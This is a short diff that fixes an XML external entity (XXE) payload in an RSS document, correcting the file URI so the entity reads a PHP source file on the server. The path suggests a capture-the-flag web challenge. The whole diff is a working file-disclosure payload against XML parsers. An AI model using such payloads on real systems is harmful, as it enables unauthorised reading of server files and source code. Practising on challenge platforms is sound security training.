@@ -1,5 +1,5 @@
   <!DOCTYPE foo [
-  <!ENTITY xxe SYSTEM "file///challenge/web-serveur/ch29/index.php">
+  <!ENTITY xxe SYSTEM "file:///challenge/web-serveur/ch29/index.php">
   ]
 >
 <rss version="2.0">
